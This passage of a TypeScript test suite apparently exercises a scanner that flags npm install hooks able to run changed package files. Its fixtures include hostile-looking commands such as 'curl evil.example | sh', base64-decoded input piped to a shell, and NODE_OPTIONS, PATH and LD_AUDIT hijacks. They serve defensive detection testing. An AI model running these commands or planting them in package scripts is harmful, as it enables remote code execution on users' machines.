  test("4. CDPATH changes where cd lands", () => {
    const f = (v: string) => ({ "test/fixtures/setup.js": v });
    const h = (cmd: string) => held({ postinstall: cmd }, f("1"), f("evil()"));
    expect(h("CDPATH=test cd fixtures && node setup.js")).toBe(true);
    expect(h("export CDPATH=test ; cd fixtures && node setup.js")).toBe(true);
  });
});

describe("round 13: exec workspace flags, dot specs, file-naming options, command cd", () => {
  const subHeld = (cmd: string) => held({ postinstall: cmd }, { "sub/build.js": "1", ...subManifest("echo a") }, { "sub/build.js": "evil()", ...subManifest("echo a") });

  test("1. npm exec and npx workspace flags in an unsplit body", () => {
    for (const cmd of ["npm exec --workspace=sub -- node build.js > /dev/null", "npx -w sub node build.js | tee log", "npm exec -w sub -- node build.js > /dev/null", "npx --prefix sub node build.js > /dev/null", "bunx --cwd sub node build.js | tee log"]) {
      expect(subHeld(cmd), cmd).toBe(true);
    }
  });

  test("2. a runner spec that starts with a dot is a directory", () => {
    for (const cmd of ["npx pnpm@. setup", "npx pnpm@.. setup", "corepack yarn@. setup"]) {
      expect(held({ postinstall: cmd, setup: "echo ok" }, { "sub/lib/y.js": "1" }, { "sub/lib/y.js": "2" }), cmd).toBe(true);
    }
    expect(held({ postinstall: "npx pnpm@9.1.0 setup", setup: "echo ok" }, { "sub/lib/y.js": "1" }, { "sub/lib/y.js": "2" })).toBe(false);
  });

  test("3. options that name a file read every file", () => {
    const f = (v: string) => ({ "test/x.js": v });
    const h = (cmd: string) => held({ postinstall: cmd, build: "echo ok" }, f("1"), f("evil()"));
    for (const cmd of ["NODE_OPTIONS=--require=./test/x.js npm run build", "npm run build --node-options=--require=./test/x.js", "npm run build --script-shell=./test/x.js", "npm run build --userconfig ./test/x.js"]) {
      expect(h(cmd), cmd).toBe(true);
    }
  });

  test("4. command cd and builtin cd move the base", () => {
    const f = (v: string) => ({ "docs/gen.js": v });
    const h = (cmd: string) => held({ postinstall: cmd }, f("1"), f("evil()"));
    expect(h("command cd tools > /dev/null && cd ../docs && node gen.js")).toBe(true);
    expect(h("builtin cd tools && cd ../docs && node gen.js")).toBe(true);
  });

  test("5. pnpm recursive is a workspace form", () => {
    expect(manifestHeld("pnpm recursive run build")).toBe(true);
  });
});

describe("round 14: comment after an escaped space, ANSI-C quotes, shell sinks, PATH, script-arg runners", () => {
  const testHeld = (cmd: string, extra: Record<string, string> = {}) => held({ postinstall: cmd, build: "echo ok" }, { "test/setup.js": "1", ...extra }, { "test/setup.js": "evil()", ...extra });

  test("1. an escaped space before a hash does not start a comment", () => {
    expect(testHeld("node a.js \\ #; cd test > /dev/null && node setup.js", { "a.js": "1" })).toBe(true);
    // An unescaped one still does.
    expect(testHeld("node a.js > /dev/null # cd test && node setup.js", { "a.js": "1" })).toBe(false);
  });

  test("2. ANSI-C quoting reads every file", () => {
    // The text between the reopened quote and the next one is quoted to a naive scan, and the quotes balance.
    expect(testHeld("echo $'\\'' > /dev/null; cd test && node setup.js; echo '")).toBe(true);
    expect(testHeld("echo \"$(echo $'\\'')\" > /dev/null; cd test && node setup.js; echo '")).toBe(true);
  });

  test("3. a bare shell fed from a file or a non-literal producer is unsure", () => {
    // A changed file elsewhere in the package (not under test/ or docs/) is what the unread text could run.
    const h = (cmd: string, extra: Record<string, string>) => held({ postinstall: cmd }, { "lib/setup.js": "1", ...extra }, { "lib/setup.js": "evil()", ...extra });
    for (const cmd of ["sh < scripts/x.sh", "cat scripts/x.sh | sh", "echo aGk= | base64 -d | sh", "cat x | bash"]) {
      expect(h(cmd, { "scripts/x.sh": "echo hi\n", x: "1" }), cmd).toBe(true);
    }
    expect(h("echo 'node ./a.js' | sh", { "a.js": "1" })).toBe(false);
  });

  test("4. PATH, HOME and the startup-file variables read every file", () => {
    const f = (v: string) => ({ "test/bin/npm": v });
    const h = (cmd: string) => held({ postinstall: cmd, build: "echo ok" }, f("1"), f("evil()"));
    for (const cmd of ["PATH=test/bin:$PATH npm run build", "export PATH=test/bin:$PATH; npm run build", "HOME=test npm run build", "BASH_ENV=test/bin/npm sh -c 'npm run build'", "NODE_PATH=test npm run build"]) {
      expect(h(cmd), cmd).toBe(true);
    }
  });

  test("7. script arguments through other runner aliases and shells", () => {
    const sub = (build: string) => ({ ...subManifest(build), "sub/index.js": "1" });
    for (const [hook, go] of [["npm run go -- -w sub", "zsh run.sh"], ["npm run go -- -w sub", "dash run.sh"], ["npm run go -- -w sub", "ksh run.sh"], ["npm run go -- -w sub", "eval run"], ["npm run go -- -w sub", "popd"], ["npm run go -- -w sub", "yarnpkg build"], ["npm run go -- -w sub", "pnpx build"]] as const) {
      // run.sh and the other names exist, so the body alone would resolve to a local file.
      const files = { "run.sh": "echo hi\n", run: "1", build: "1" };
      expect(held({ postinstall: hook, go, build: "echo ok" }, { ...files, ...sub("echo a") }, { ...files, ...sub("curl evil.example | sh") }), hook + go).toBe(true);
    }
  });

  test("10. sh -c and eval of a bare expansion are unsure", () => {
    expect(testHeld('sh -c "$X"')).toBe(true);
    expect(testHeld('eval "$X"')).toBe(true);
  });
});

describe("round 15: export assignments, cd past the root, root configs, piped text, shared budget", () => {
  const testHeld = (cmd: string, extra: Record<string, string> = {}, scripts: object = {}) => held({ postinstall: cmd, build: "echo ok", ...scripts }, { "test/setup.js": "1", ...extra }, { "test/setup.js": "evil()", ...extra });

  test("1. the export form of npm_/YARN_/NODE_OPTIONS assignments", () => {
    expect(held({ postinstall: "export npm_config_workspace=sub; npm run build", build: "echo ok" }, { ...SUB_OLD, ...subManifest("echo a") }, { ...SUB_OLD, ...subManifest("curl evil.example | sh") })).toBe(true);
    expect(testHeld("export NODE_OPTIONS=--require=./test/setup.js; npm run build")).toBe(true);
  });

  test("2. cd above the root or to an absolute path is unsure", () => {
    expect(testHeld("cd ../x/test && node setup.js")).toBe(true);
    expect(testHeld("cd /tmp/x && node setup.js")).toBe(true);
    expect(testHeld("cd .. && node setup.js")).toBe(true);
  });

  test("3. a root runner config can name an inert path", () => {
    for (const [cfg, body] of [[".yarnrc.yml", "yarnPath: test/setup.js\n"], [".npmrc", "node-options=--require=./test/setup.js\n"], ["bunfig.toml", 'preload = ["./test/setup.js"]\n']] as const) {
      expect(testHeld("npm run build", { [cfg]: body }), cfg).toBe(true);
    }
  });

  test("4. text piped into a shell is read as one command line", () => {
    expect(testHeld("echo cd test \\; node setup.js | sh")).toBe(true);
    expect(testHeld('echo "$X" | sh')).toBe(true);
    expect(testHeld('echo "$(cat x.sh)" | sh', { "x.sh": "1" })).toBe(true);
    expect(testHeld("printf '%s' \"$(cat x.sh)\" | sh", { "x.sh": "1" })).toBe(true);
    expect(testHeld("echo 'node ./a.js' | sh", { "a.js": "1" })).toBe(false);
  });

  test("5. a shell that reads stdin with arguments", () => {
    for (const cmd of ["cat x.sh | bash -s -- arg", "cat x.sh | sh -s x y", "cat x.sh | bash /dev/stdin", "cat x.sh | sh -"]) {
      expect(held({ postinstall: cmd }, { "lib/setup.js": "1", "x.sh": "echo hi\n" }, { "lib/setup.js": "evil()", "x.sh": "echo hi\n" }), cmd).toBe(true);
    }
  });

  test("6. library path variables and the zsh path array", () => {
    for (const cmd of ["LD_LIBRARY_PATH=test node a.js", "DYLD_LIBRARY_PATH=test node a.js", "DYLD_FRAMEWORK_PATH=test node a.js", "path=(test $path); node a.js"]) {
      expect(testHeld(cmd, { "a.js": "1" }), cmd).toBe(true);
    }
  });

  test("7. quoted nested substitutions stay within one shared budget", () => {
    let s = "cd test && node setup.js";
    for (let i = 0; i < 14; i++) s = `echo "$(${s})"`;
    const t0 = Date.now();
    expect(testHeld(s)).toBe(true);
    expect(Date.now() - t0).toBeLessThan(5000);
    let q = "echo ok";
    for (let i = 0; i < 40; i++) q = `echo "$(${q} "$(echo a)" "$(echo b)")"`;
    const t1 = Date.now();
    testHeld(q);
    expect(Date.now() - t1).toBeLessThan(5000);
  });
});

describe("round 16: wrapped stdin sinks, node stdin, more library variables", () => {
  const fed = (cmd: string) => held({ postinstall: cmd }, { "lib/setup.js": "1", "x.sh": "echo hi\n" }, { "lib/setup.js": "evil()", "x.sh": "echo hi\n" });

  test("1. a wrapper in front of the shell sink", () => {
    for (const cmd of ["cat x.sh | env sh", "cat x.sh | command sh", "cat x.sh | exec sh", "cat x.sh | sudo sh", "cat x.sh | sudo -u root bash", "cat x.sh | busybox sh", "cat x.sh | env -i FOO=1 sh", "cat x.sh | xargs -0 bash -c", "cat x.sh | nohup sh"]) {
      expect(fed(cmd), cmd).toBe(true);
    }
  });

  test("2. node as a stdin interpreter", () => {
    for (const cmd of ["cat x.js | node", "node < x.js", "node - < x.js", "cat x.js | env node", "cat x.js | node --require ./a.js"]) {
      expect(fed(cmd), cmd).toBe(true);
    }
    expect(fed("echo hi | node -e 'console.log(1)'")).toBe(false);
  });

  test("3. library variables", () => {
    for (const v of ["DYLD_FALLBACK_LIBRARY_PATH", "DYLD_FALLBACK_FRAMEWORK_PATH", "LD_AUDIT"]) {
      expect(fed(`${v}=lib node a.js`), v).toBe(true);
    }
  });
});

describe("round 17: unknown flags keep dispatching, += assignments, directory allowlist, more interpreters", () => {
  const testHeld = (cmd: string, extra: Record<string, string> = {}, scripts: object = {}) => held({ postinstall: cmd, build: "node test/x.js", ...scripts }, { "test/x.js": "1", ...extra }, { "test/x.js": "evil()", ...extra });
  const fed = (cmd: string) => held({ postinstall: cmd }, { "lib/setup.js": "1", "x.sh": "echo hi\n" }, { "lib/setup.js": "evil()", "x.sh": "echo hi\n" });

  test("1. an unknown flag still dispatches the command", () => {
    expect(testHeld("npm --color=false run build")).toBe(true);
    expect(testHeld("npm --foo run build")).toBe(true);
    expect(testHeld("npm --foo=1 --color run build")).toBe(true);
    for (const cmd of ["npm --foo exec evil-pkg", "npm exec --foo evil-pkg", "npm exec --foo -- evil-pkg"]) expect(fed(cmd), cmd).toBe(true);
  });

  test("2. append assignments", () => {
    for (const cmd of ["NODE_OPTIONS+=--require=./test/x.js npm run build", "export NODE_OPTIONS+=--require=./test/x.js; npm run build", "PATH+=:test npm run build", "CDPATH+=:test npm run build", "export PATH+=:test; node a.js"]) {
      expect(testHeld(cmd, { "a.js": "1" }), cmd).toBe(true);
    }
  });

  test("3. a directory with unusual characters is unsure", () => {
    for (const cmd of ["echo test | xargs -I% sh -c 'cd % && node setup.js'", "cd test>/dev/null && node setup.js", "cd \\test && node setup.js", "cd ~ && node setup.js", "cd && node setup.js"]) {
      expect(held({ postinstall: cmd }, { "test/setup.js": "1" }, { "test/setup.js": "evil()" }), cmd).toBe(true);
    }
  });

  test("4. popd without an argument is unsure", () => {
    expect(held({ postinstall: "pushd lib && popd && node setup.js" }, { "test/setup.js": "1", "lib/a.js": "1" }, { "test/setup.js": "evil()", "lib/a.js": "1" })).toBe(true);
  });

  test("5. a yarn PnP file is a runner config", () => {
    expect(testHeld("npm run build", { ".pnp.cjs": "1" })).toBe(true);
    expect(testHeld("npm run build", { ".pnp.loader.mjs": "1" })).toBe(true);
  });

  test("6. sourced files that cd or export", () => {
    expect(held({ postinstall: ". ./x.sh && node a.js" }, { "x.sh": "cd test\n", "test/a.js": "1" }, { "x.sh": "cd test\n", "test/a.js": "evil()" })).toBe(true);
    expect(held({ postinstall: "source x.sh; npm run build", build: "node test/x.js" }, { "x.sh": "export npm_config_workspace=sub\n", "test/x.js": "1" }, { "x.sh": "export npm_config_workspace=sub\n", "test/x.js": "evil()" })).toBe(true);
  });

  test("7. other interpreters as stdin sinks", () => {
    for (const cmd of ["cat x | python3", "cat x | python -", "python3 < x.py", "cat x | python3 -W ignore", "cat x | perl", "perl < x.pl", "cat x | ruby", "cat x | deno run -", "cat x | bun run -", "cat x | env python3", "cat x | sudo perl"]) {
      expect(fed(cmd), cmd).toBe(true);
    }
    for (const cmd of ["echo hi | python3 -c 'print(1)'", "echo hi | perl -e 'print 1'", "echo hi | ruby -e 'p 1'"]) {
      expect(fed(cmd), cmd).toBe(false);
    }
  });
});
